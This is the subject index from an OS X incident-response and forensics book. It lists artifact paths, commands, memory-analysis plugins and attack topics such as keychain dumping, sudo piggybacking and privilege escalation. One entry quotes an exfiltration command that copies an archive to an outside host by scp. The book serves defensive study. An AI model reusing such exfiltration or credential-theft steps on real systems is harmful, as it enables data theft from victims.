.kext, 146
KEXT bundles, 103, 146
binary, 103
information property list, 103
resources, 103
KEXT commands, 104
KEXT file, 117, 160, 244
Kextload command, 104, 146
kextstat command, 29
kextunload command, 104
keychaindump rule, 198, 199
Key file artifacts, 66
/.bash_history, 66
/.bash_logout, 67
/.bash_profile # /.bash_login 
/.profile /.bashrc, 67
/Library/Logs/DiskUtility.log, 68
/Library/Preferences/com.apple.
finder.plist, 68
/Library/Preferences/com.
apple.LaunchServices. 
QuarantineEventsV*, 66
/Library/Preferences/com.apple.
loginitems.plist, 68
/Library/Preferences/com.apple.
recentitems.plist, 67
/etc/bashrc, 67

Subject Index
261
/etc/profile, 67
/Library/Logs/AppleFileService/
AppleFileServiceError.log, 71
/Library/Preferences/System 
Configuration/com.apple. 
airport.preferences.plist, 69
/private/etc/hosts, 70
/private/etc/kcpassword, 70
/private/etc/resolv.conf, 69
/private/etc/sudoers, 70
/private/var/db/launchd.db/com.
apple.launchd/overrides. 
plist, 69
/private/var/log/asl/*.asl, 67
/private/var/log/fsck_hfs.log, 70
/var/audit/*, 73
/var/log/apache2/access_log, 71
/var/log/apache2/error_log, 71
/var/log/appfirewall.log, 72
/var/log/hdiejectd.log, 72
/var/log/install.log, 72
/var/log/opendirectoryd.log, 71
/var/log/system.log, 67
/var/log/wifi.log, 72
Kill Chain, 6
actions and objectives, 7
command and control, 7
delivery, 7
exploitation, 7
installation, 7
reconnaissance, 6
weaponization, 7
kMDItemWhereFroms attribute, 55
L
last (user) command, 26
Lateral movement, 209
Launch agents, 93
launchctl command, 97
list command, 29, 113
load command, 97
Launch daemons, 93
launchd process, 92
Linux, 9
Linux 
LD_PRELOAD, 246
machine, 165
memory dumps, 143
secure copy (scp) tool, 10
server, 175
Little Snitch program, 244
Live memory analysis, 154
Login hooks, 106
login.keychain file, 197
Logout hooks, 106
lsof (-p pid) (-i) command, 28
Lua script, 62
LZMA format, 208
M
mac_auth command, 196
mac_bash command, 159, 173
MacBook Air, 1
MacBooks, 1
mac_check_syscalls, 158
mac_dead_procs, 156
Mach-O binary, 146
Macintosh File System (MFS), 49
MacMavericks_10_9_5_AMDx64, 154
Mac OS, 2
/.MacOSX/environment.plist, 250
MacPmem.kext, 146, 152
mac_pslist plugin, 155
MALLOC_TINY, 191
Malware, 8, 9, 42, 198
advance techniques, 241
OS X variants, 42
xslcmd, 14
md5 command, 30
mdfind command, 204
(-name), 29
(-onlyin), 29
Memory acquisition, 144, 162
Memory analysis, 143
memory.dmp, 151
memory.strings, 167
memory tools, 143
.metadata_never_index, 65
Metasploit, 198
MFS. See Macintosh File System (MFS) 
mount command, 210
Mounting file shares, 210
Mounting shares, 209
mount_smbfs command, 211
moz_annos, 130
moz_attribute_id, 131
N
netstat (-ru) (-an) command, 28
nettop (-m) command, 31
net use command, 210
Network information commands, 27
arp (-a), 28
ifconfig, 27
lsof (-p pid) (-i), 28
netstat (-ru) (-an), 28
networksetup, 28
security dump-trust-settings (-s) 
(-d), 28
smbutil (statshares -a), 28
networksetup command, 28
newgrp, 180
FolderName.noindex, 65
Normal file, 59
ns.txt, 172
nvram command, 30
O
Objective-C, 172
OpenBSD, 17
Open Group, 2
Opera, 132
history, 132
Operating systems, 1, 145
OS X App Sandbox, 253
OS X El Capitan, 144, 176
OS X Flashback, 250
malware, 250
OS X login, 202
OS X malware, 1
OS X Mavericks, 38
OS X memory analysis, 152
OS X metasploit, 189
OS X Mountain Lion, 2
OS X Panther, 119
osx_patch, 87, 217
OSXPMem tool, 143, 144, 145, 
148, 149
OS X system, 1, 11, 25, 49, 91, 143, 
176
OS X volatility, 152
P
PanGPS tool, 184
binary, 184
Password free time, 180
Passwords, 184
Dave Grohl tool, 189
dumping login hashes, 187
keychain and security command, 
184
Keychaindump, 191
quick hash dump, 189
Patching binaries, 248
Periodic, 250
Perl, 62, 205
Permissions, 52
Personal computing, 2
PF configurations, 17

Subject Index
262
Pfctl rule, 18
phishing, 140
email, 223
Php script, 62
Physical memory, 144
ping command, 183
PKZip format, 18, 205
PKzip magic numbers, 212
places.sqlite database, 129
plistbuddy, 107
.plist files, 92
Plugin malware, 250
plugins application, 250
PreLoginAgents, 94
printenv command, 27, 31
privilege escalation, 176
Process id (PID), 41, 245
Process information, 27
ps (aux), 27
proc_pidfdinfo function, 247
ProgramArguments key, 95
ps aux command, 156
ps.txt, 172
.py script, 217
Python, 4, 11, 62, 201, 205, 207, 216
Q
Quarantine, 55, 251
R
Rails web framework, 12
Random identification number, 106
Read permissions, 54
Real ID, 180
Reconnaissance, 6
Rekall documentation, 161
Rekall Framework, 160
Rekall Memory Analysis 
Framework, 144
Resource forks, 58
Root through standard 
installation, 177
Ruby, 12, 62
script, 205, 216
RunAtLoad key, 95
S
Safari, 120
database, 124
downloads, 122
files of interest, 123
history database, 121
history plist, 120
Sandbox, 253
“scp thumbs.db anon@axrgcb.
sysclouds.com:, 219
screen (-ls) (-x) command, 27
Scripting languages, 62
apple script, 62
apple script bundle file, 62
bash script, 62
javascript, 62
lua script, 62
Perl, 62
php script, 62
Python, 62
ruby, 62
Tool Command Language script, 62
Scripting, memory analysis, 165
Scripts, 34
Secure copy, 209
Secure copy (scp) tool, 10
secure ftp (sftp), 209
security dump-trust-settings (-s) (-d) 
command, 28
security list-keychains command, 30
security_update.zip, 139
Security_update.zip, 156
sed command, 16
Setgid binaries, 53
Setuid binaries, 53, 181
Setuid exploitation, 180
Shellshock, 183
SIP. See System Integrity Protection 
(SIP) 
SMB share, 56, 209, 210
smbutil (statshares -a) command, 28
Social engineering, 177
skills, 177
user level, 177
sort command, 16
spctl (--status) command, 26
Special file permissions, 53
.Spotlight-V100, 65
sqlite3, 121
database format, 120
SSH authorized_keys, 250
Standard OS X sudoers file, 194
Standard user, 12
StartInterval key, 95
StartupItems, 102
RC scripts, 107
StartupParameters. plist, 108
Sticky bit, 54
sudo command, 193
sudo -K, 178
Sudo piggybacking, 178
sudo su, memory, 151
swapfile0, 144
swapfile1, 144
Swap Files, 144
sw_vers command, 26
“sw_vers” output, 153
sysctl (-a) command, 30
sysctl vm.swapusage, 145
System boot, 91
EFI booter, 92
EFI Boot ROM, 92
launchd, 92
XNU KernelCache, 92
System Clock Exploit, 182
/System directory, 176
System info commands, 25
bash -version, 26
date, 25
hostname, 25
spctl (--status), 26
sw_vers, 26
uname (-a), 26
uptime, 26
System Integrity Protection (SIP), 
176, 254–257
directories, 254
System security, 178
System Software 1.0, 2
System startup commands, 29
atq, 29
crontab -l, 29
kextstat, 29
launchctl list, 29
T
Tactics, techniques, and procedures 
(TTPs), 6
Tar, 205
tar -cvf thumbs.db osx_patch, 218
tcpdump command, 31
TCP tools, 209
test.sh command, 102
thumbs.db, 218
thumbs.db.gz, 219
Timeline 
data, 134
Timestamps, 51, 206
analysis, 204
for files, 51
accessed, 51
birth, 52
changed, 51
modified, 51

Subject Index
263
for folders, 52
accessed, 52
birth, 52
changed, 52
modified, 52
Tool Command Language  
script, 62
TTPs. See Tactics, techniques, and 
procedures (TTPs) 
U
UID. See Unique user id (UID) 
umount command, 211
uname (-a) command, 26
uniq command, 16
Unique user id (UID), 13
Unix, 1
Unix Product Standard, 2
UNIX Sockets, 157
Updates collection toolset, 165
uptime command, 26
User information commands, 27
dscl (. -ls/Users), 27
groups, 27
id, 27
printenv, 27
/usr/bin/ directory, 196
/usr/bin/mac_auth, 196
UTC format, 123
V
/var/db/dslocal/nodes/Default/
users/$USER.plist, 187
/var/db/sudo, 182
VOIP-based internet meetings, 94
Volatility, 151
analysis, 157
documentation, 155
framework, 143
github page, 153
project, 144
Volume header, 50
VPN tool, 184
Vulnerable dylibs, scanning  
for, 244
W
w command, 26
Weaponization, 7
web browser history, 139
WebHistoryDates, 120
WebHistoryDomains, 120
Web server, 183
whoami command, 26
who command, 26
Who info commands, 26
finger (-m), 26
last (user), 26
screen (-ls) (-x), 27
w, 26
who, 26
whoami, 26
Windows operating  
system, 1
Windows pagefile.sys, 144
X
xattr command, 54
Xcode, 245
XNU kernel, 3
XNU KernelCache, 92
X-Protect, 253
xslcmd, 14
XSLcmd rule, 22
xz tool, 208
Y
Yara, 13
rules, 166, 198
scan, 199
Z
zip file, 217
format, 149
zlibCompressionLevel, 18

